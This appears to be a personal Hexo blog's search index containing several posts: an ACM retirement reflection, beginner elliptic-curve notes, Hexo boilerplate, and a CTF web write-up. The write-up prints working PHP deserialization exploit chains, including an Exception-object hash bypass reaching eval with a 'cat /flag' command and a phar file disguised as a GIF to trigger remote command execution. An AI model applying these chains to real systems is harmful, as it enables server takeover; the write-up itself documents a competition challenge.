<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Good Bye ACM</title>
    <url>/2021/05/20/Good-Bye-ACM/</url>
    <content><![CDATA[<h2 id="再见，Die-java"><a href="#再见，Die-java" class="headerlink" title="再见，Die_java"></a>再见，Die_java</h2><p>笔者是打OI出身的…高中时候用博客园建了个博客，链接是<a href="https://www.cnblogs.com/FYH-SSGSS">这个</a>。是专门记录做题的，后来高二退役之后就基本没碰，到了大一原计划是转方向打CTF的，但是十分神奇的听了学校宣讲就被拉去打ACM了，同时也组了队，队名是铲车人，英文名是Die_java于是那个博客园又变成了记录打ACM的记录，之后学校成立了wiki，把队内训练的记录全放在了<a href="https://wiki.buaaacm.com/doku.php?id=2020-2021:teams:Die_Java:front_page">这里</a>。在学校集训队摸爬滚打了大一下以及大一暑假，历经了十几次训练，最终，我们以校内第11队勉强出线了…在大二上的CCPC秦皇岛站拿了银，ICPC济南站拿了金（虽然是倒数第二）。回顾这一年来，各种酸甜苦辣尝尽后回看这两块牌子，真是回味无穷。尽管中间训练经常被暴打，很自闭，但还是坚持下来了，并拿了一个不错的成绩，感谢我的两位队友的carry，没有你们的陪同，我是不可能坚持到那一刻的。大二寒假，我们队内都不想打下一个赛季了，于是铲车人就光荣的退役啦！</p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title>babyECC</title>
    <url>/2021/05/26/babyECC/</url>
    <content><![CDATA[<h1 id="椭圆曲线初学"><a href="#椭圆曲线初学" class="headerlink" title="椭圆曲线初学"></a>椭圆曲线初学</h1><p>随手整理的，可能全是错。。</p>
<span id="more"></span>
<p>椭圆曲线方程:$y^2=x^3+ax+b$，其中$a,b\in R$</p>
<p>判别式：$\Delta = -16(4a^3+27b^2)\neq0$</p>
<p>当$\Delta&gt;0$时，曲线有两个联通分量，$\Delta&lt;0$时候有一个联通分量。</p>
<p><img src="/2021/05/26/babyECC/photo/ECC01.png" alt="ECC1"></p>
<h2 id="椭圆曲线的运算"><a href="#椭圆曲线的运算" class="headerlink" title="椭圆曲线的运算"></a>椭圆曲线的运算</h2><ul>
<li><p>定义了一个$E$上的交换群，这个群以无穷远点$O$为单位元。</p>
</li>
<li><p>定义 + 运算子：取E上的两点$P$,$Q$，若两者相异，$P + Q$表示穿过$P$和$Q$的弦和椭圆曲线相交的第三点，再经x轴反射的镜像点；若两者是同一点，$P+P=2P$表示以$P$为切点和椭圆曲线相交的点再经x轴反射的镜像点。若P和Q的弦与y轴平行，$P+Q=0$（无限远点）。</p>
</li>
<li><p>性质1：$O+P=P+O$</p>
</li>
<li><p>性质2：$-P=(x,-y)$</p>
</li>
<li><p>具体运算：要是我上高中沉迷于圆锥曲线肯定是会动手算的，可惜现在早已没了当时的劲头：</p>
<script type="math/tex; mode=display">
P_3=(x_3,y_3)=P_1+P_2\neq O</script><script type="math/tex; mode=display">
x_3=k^2-x_1-x_2</script><script type="math/tex; mode=display">
y_3=k(x_1-x_3)-y_1</script><script type="math/tex; mode=display">
其中k=\dfrac{y_2-y_1}{x_2-x_1},(x_1\neq x_2)或\dfrac{3x_1^2+a}{2y_1}.(x1=x_2)</script></li>
</ul>
<h2 id="素域上的椭圆曲线"><a href="#素域上的椭圆曲线" class="headerlink" title="素域上的椭圆曲线"></a>素域上的椭圆曲线</h2><p>模$P$,除法全变成逆元。</p>
<h2 id="GF-2-n-上的椭圆曲线"><a href="#GF-2-n-上的椭圆曲线" class="headerlink" title="$GF(2^n)$上的椭圆曲线"></a>$GF(2^n)$上的椭圆曲线</h2><h2 id="椭圆曲线上的加解密"><a href="#椭圆曲线上的加解密" class="headerlink" title="椭圆曲线上的加解密"></a>椭圆曲线上的加解密</h2><p>用户A的私钥$n_A$,公钥为$P_A=n_A\times G$</p>
<p>用户A的私钥$n_B$,公钥为$P_A=n_B\times G$</p>
<p>A将消息$P_m$加密过程：</p>
<ul>
<li>选取随机数$k$,密文$C_m=\{kG,P_m+kP_B\}$，简记为$\{C_1,C_2\}$</li>
</ul>
<p>解密过程：$C_2-n_BC_1=P_m+kP_B-kn_BG=P_m$，解密完成。</p>
<h2 id="具体应用"><a href="#具体应用" class="headerlink" title="具体应用"></a>具体应用</h2><ul>
<li><p>求一条椭圆曲线的阶，这个可以用schoof算法在多项式时间内解决。</p>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/Schoof&#39;s_algorithm">schoof链接</a></p>
</blockquote>
</li>
<li><p>已知一个点，求这个点的阶，这个用hasse算法也可以解决。</p>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/Hasse%27s_theorem_on_elliptic_curves">链接</a></p>
</blockquote>
</li>
<li><p>生成标准里要求$n$为素数，那么实际问题都是我们已知$n$,去求$G$。</p>
<p><img src="/2021/05/26/babyECC/photo/ECC02.png" alt="ECC2"></p>
</li>
</ul>
<p>原以为这些都要自己手动实现，后来经助教确认不用了，那就简单记录一下sage里面椭圆曲线的用法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">E = EllipticCurve(GF(p), [a, b]) <span class="comment">#表示生成一个参数为a,b,p的椭圆曲线</span></span><br><span class="line">E.order() <span class="comment">#群的阶</span></span><br><span class="line">P = E.random_point() <span class="comment">#随机一点</span></span><br><span class="line">P = E(xxxxx,yyyy) <span class="comment">#点的坐标</span></span><br><span class="line">P.order() <span class="comment">#元素的阶</span></span><br><span class="line">P.discrete_log(Q) <span class="comment">#P,Q是曲线上两点，尝试去求离散对数</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>school</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/05/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>hellohexo</title>
    <url>/2021/05/18/hellohexo/</url>
    <content><![CDATA[<h2 id="hellohexo"><a href="#hellohexo" class="headerlink" title="hellohexo"></a>hellohexo</h2><p>之前一直想建一个像模像样的博客，因为各种事情一直搁置，终于，在国赛比完后的第二天一时兴起，决定要搭一个github博客，采用了hexo这个静态博客网站生成器，用的是next主题，可能还不是很好看，后期会逐渐完善的~</p>
<p>本博客暂时先记录我在本科阶段打ctf的一些学习笔记和writeup，以及课内学的复习笔记（如果我用电脑复习的话），或者一些好玩的东西也尽量往上放。</p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>bluecat</title>
    <url>/2021/06/06/bluecat/</url>
    <content><![CDATA[<h1 id="蓝帽杯复赛Web方向WP"><a href="#蓝帽杯复赛Web方向WP" class="headerlink" title="蓝帽杯复赛Web方向WP"></a>蓝帽杯复赛Web方向WP</h1><p>信息论考试推迟，导致又能去蓝帽杯线下了，可惜主办方跟我们说你们还是线上打吧，但是外地旅游的去意已决，最后硬着头皮和队友们还有学长去哈尔滨了，这波叫去线下打线上赛。</p>
<span id="more"></span>
<h2 id="jack-and-rose"><a href="#jack-and-rose" class="headerlink" title="jack and rose"></a>jack and rose</h2><p>反序列化链题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlight_file(__file__);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$action</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$b</span>-&gt;<span class="variable">$a</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Love</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$rose</span> = <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">        call_user_func(<span class="variable">$rose</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;jack love rose&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Titanic</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$people</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ship</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;people-&gt;action=<span class="keyword">$this</span>-&gt;ship;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rose</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;var1 != <span class="keyword">$this</span>-&gt;var2) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;var1) === md5(<span class="keyword">$this</span>-&gt;var2)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;var1)=== sha1(<span class="keyword">$this</span>-&gt;var2)) )&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;var1);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;love&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$sail</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;love&#x27;</span>];</span><br><span class="line">    unserialize(<span class="variable">$sail</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先看利用链的重点，需要绕过md5和sha1，目前我所知的绕过方法只有数组，但是数组绕过后，eval没法执行数组，所以没法用数组绕。</p>
<p>参考了这篇文章<a href="https://mayi077.gitee.io/2020/08/14/%E5%88%A9%E7%94%A8-Exception%E7%B1%BB-%E7%BB%95%E8%BF%87md5-sha1-%E7%AD%89%E7%B3%BB%E5%88%97/">https://mayi077.gitee.io/2020/08/14/%E5%88%A9%E7%94%A8-Exception%E7%B1%BB-%E7%BB%95%E8%BF%87md5-sha1-%E7%AD%89%E7%B3%BB%E5%88%97/</a></p>
<p>大概思路就是找到一个类的两个对象，使得他们的__tostring函数一样然而对象不一样，找到了Exception类，他的tostring就是异常的信息。这样是可以绕过的，那么问题就是如何利用eval，可以看到这个tostring后面还有很多乱七八糟的代码，</p>
<p><img src="/2021/06/06/bluecat/assets/image-20210606102237400.png" alt="image-20210606102237400"></p>
<p>所以我们需要?&gt;闭合php方可进行RCE。</p>
<p>然后开始从头开始找链子，所有魔术方法中只有Titanic的析构函数能作为入口，这里面调用了一个对象的action，然后进行了赋值，这块很明显就是用Jack类的<code>__set</code>方法激活，这个方法会再调用一个函数，现在只剩下Love类的<code>__call</code>方法，call这块会进行一个函数回调，传入一个Rose类的话就会调用<code>__invoke</code>，然后就完了。</p>
<p>因为exception类里有private和protected类型，所以最终一定要url编码！！（被这卡了半天真是蠢死了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> =<span class="string">&#x27;system(&quot;cat /flag&quot;);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$ex1</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);<span class="variable">$ex2</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$timeline</span> = <span class="keyword">new</span> Rose();</span><br><span class="line"><span class="variable">$timeline</span>-&gt;var1 = <span class="variable">$ex1</span>;</span><br><span class="line"><span class="variable">$timeline</span>-&gt;var2 = <span class="variable">$ex2</span>;</span><br><span class="line"><span class="variable">$tt</span> = <span class="keyword">new</span> Titanic();</span><br><span class="line"><span class="variable">$J</span> = <span class="keyword">new</span> Jack();</span><br><span class="line"><span class="variable">$love</span> = <span class="keyword">new</span> Love();</span><br><span class="line"><span class="variable">$love</span>-&gt;var = <span class="variable">$timeline</span>;</span><br><span class="line"><span class="variable">$tt</span>-&gt;ship = <span class="variable">$love</span>;</span><br><span class="line"><span class="variable">$tt</span>-&gt;people = <span class="variable">$J</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$tt</span>)) ;</span><br></pre></td></tr></table></figure>
<p>顺便记录一下遍历php各个类的方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$classes</span> = get_declared_classes();  <span class="comment">//返回由已定义类的名字所组成的数组</span></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$c</span>) &#123;  <span class="comment">//get_class_methods返回由类的方法名组成的数组</span></span><br><span class="line">		<span class="keyword">if</span> (in_array(<span class="string">&#x27;__toString&#x27;</span>, get_class_methods(<span class="variable">$c</span>)))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="不一样的web"><a href="#不一样的web" class="headerlink" title="不一样的web"></a>不一样的web</h2><p>注释里藏有Read类和Test类，界面有一个上传头像，虽说是要求gif，实则没有任何过滤，仅要求文件末尾是.gif，传个稍微大一点的头像就500了，传入成功后会告诉我们头像的地址，下面有一个输入地址的框可以显示头像是否成功上传。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;f = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;f;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="string">&quot;lib.php&quot;</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>唯一的反序列化点就是下面那个Url了，本地生成phar然后修改后缀为.gif直接上传，然后在下面用phar://触发反序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;aa.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test(<span class="string">&#x27;Read::file_get&#x27;</span>);<span class="comment">//读lib.php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test(<span class="string">&#x27;phpinfo&#x27;</span>);<span class="comment">//获取phpinfo()</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>这题很sb的一点是每次只能上传一个文件，所以我还得反复开关靶机。。</p>
<p>新获取到的lib.php源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$old_id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$new_id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p_id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;old_id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;new_id = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p_id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new_id</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;old_id = random_bytes(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;old_id === <span class="keyword">$this</span>-&gt;new_id) &#123;</span><br><span class="line">            system(<span class="keyword">$this</span>-&gt;p_id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Files</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="keyword">$this</span>-&gt;FilesWaf(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;FilesWaf(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your file is &quot;</span> . <span class="keyword">$this</span>-&gt;FilesWaf(<span class="keyword">$this</span>-&gt;filename) . <span class="string">&quot;.&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FilesWaf</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="variable">$name</span>, <span class="string">&quot;/&quot;</span>) !== <span class="literal">False</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">$this</span>-&gt;UserWaf(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile = <span class="string">&quot;I am admin.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;UserWaf(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;profile-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;baibai&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span> . <span class="keyword">$this</span>-&gt;UserWaf(<span class="keyword">$this</span>-&gt;name) . <span class="string">&quot;.&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">UserWaf</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(<span class="variable">$name</span>) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[a-f0-9]/iu&quot;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续找利用链，终点是Modifier类的<code>__get</code>函数。很离谱的是<code>$new_id = $value;</code>，没有<code>this-&gt;</code>。所以<code>this-&gt;new_id</code>为自己可控的，为了绕过随机数检测，我们用引用赋值绕过即可。<br>如何触发<code>__get</code>，就去访问Modifier类的不存在的参数，审计了一遍，File类不存在，唯一有的就是User类的<code>__tostring</code>的<code>return $this-&gt;profile-&gt;name;</code>。所以要把User类的profile赋为Modifier类，<code>__tostring</code>在UserWaf的时候触发，所以Username中的name应该也是一个User类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> User(<span class="string">&#x27;fyhssgss&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;p_id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;profile = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;new_id = &amp;<span class="variable">$a</span>-&gt;old_id;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;aa.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>传入后成功get shell,cat /flag后啥也没有。所以得找flag。但是一次只能传一个指令，干脆直接写个马到另一个php，然后用蚁剑去连（以下的操作没有实操过</p>
<p>但是好像连上去之后蚁剑十分不稳定，所以反弹shell到自己服务器上，在game目录下找到一个/game，逆出来发现是登录密码，然后进去在/etc/passwd，存在home用户，家目录为/home/flag，flag在/home/flag/f14g_1s_h3r3</p>
<p>最后，祝贺or4nge队晋级决赛！</p>
<p><img src="/2021/06/06/bluecat/assets/image-20210606152331367.png" alt="image-20210606152331367"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Web-Training:Sqli-labs</title>
    <url>/2021/06/06/Web-Training-Sqli-labs/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
